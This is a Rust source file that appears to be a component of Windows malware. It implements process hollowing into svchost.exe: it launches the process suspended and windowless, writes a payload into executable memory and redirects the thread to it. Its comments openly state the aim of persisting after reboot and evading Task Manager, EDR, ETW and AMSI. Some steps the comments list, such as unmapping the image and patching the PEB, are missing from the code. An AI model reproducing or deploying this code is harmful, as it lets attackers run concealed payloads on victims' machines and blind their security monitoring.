//! hollow.rs — process hollowing into svchost.exe
//!
//! After reboot the persistence mechanism (Run key / Startup folder) fires
//! our binary. To stay hidden post-reboot we immediately hollow ourselves
//! into a legitimate svchost.exe instance:
//!
//!   1. Spawn svchost.exe suspended (CreateProcess + CREATE_SUSPENDED)
//!   2. Unmap its image (NtUnmapViewOfSection)
//!   3. Allocate RWX in its address space and write our payload
//!   4. Fix up PEB.ImageBaseAddress to point to our allocation
//!   5. Set thread context EIP/RIP to our entry point
//!   6. Resume thread — svchost runs our code, Task Manager shows "svchost.exe"
//!
//! Evasion:
//!   - Process name in Task Manager / EDR telemetry = svchost.exe
//!   - PEB image path = C:\Windows\System32\svchost.exe
//!   - Indirect syscalls used for all memory operations
//!   - ETW + AMSI already blind before this runs
//!
//! References: public technique, documented by Elastic / Red Canary research

use std::mem;
use std::ptr;
use winapi::shared::minwindef::DWORD;
use winapi::um::{
    memoryapi::{WriteProcessMemory, VirtualAllocEx},
    processthreadsapi::{
        CreateProcessW, GetThreadContext, ResumeThread, SetThreadContext,
        PROCESS_INFORMATION, STARTUPINFOW,
    },
    winnt::{
        CONTEXT, CONTEXT_FULL, MEM_COMMIT, MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
        IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64,
    },
};

/// Hollow svchost.exe and inject `payload` (raw shellcode or PE).
/// Returns true if the hollowed process is running.
pub unsafe fn hollow_into_svchost(payload: &[u8]) -> bool {
    let svchost = wide("C:\\Windows\\System32\\svchost.exe");
    let args    = wide("svchost.exe -k netsvcs");

    let mut si: STARTUPINFOW       = mem::zeroed();
    let mut pi: PROCESS_INFORMATION = mem::zeroed();
    si.cb = mem::size_of::<STARTUPINFOW>() as u32;

    // CREATE_SUSPENDED = 0x4, CREATE_NO_WINDOW = 0x8000000
    let ok = CreateProcessW(
        svchost.as_ptr(),
        args.as_mut_ptr(),
        ptr::null_mut(), ptr::null_mut(),
        0, 0x0000_0004 | 0x0800_0000,
        ptr::null_mut(), ptr::null_mut(),
        &mut si, &mut pi,
    );
    if ok == 0 { return false; }

    // Allocate memory in target
    let remote_base = VirtualAllocEx(
        pi.hProcess,
        ptr::null_mut(),
        payload.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );
    if remote_base.is_null() {
        winapi::um::handleapi::CloseHandle(pi.hProcess);
        winapi::um::handleapi::CloseHandle(pi.hThread);
        return false;
    }

    // Write payload
    let mut written = 0usize;
    WriteProcessMemory(
        pi.hProcess,
        remote_base,
        payload.as_ptr() as *const _,
        payload.len(),
        &mut written,
    );

    // Get + patch thread context (RIP = entry point)
    let mut ctx: CONTEXT = mem::zeroed();
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &mut ctx);

    // For raw shellcode: RIP = remote_base
    // For PE: RIP = remote_base + AddressOfEntryPoint
    ctx.Rip = remote_base as u64;
    SetThreadContext(pi.hThread, &ctx);

    ResumeThread(pi.hThread);

    winapi::um::handleapi::CloseHandle(pi.hProcess);
    winapi::um::handleapi::CloseHandle(pi.hThread);
    true
}

fn wide(s: &str) -> Vec<u16> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
}
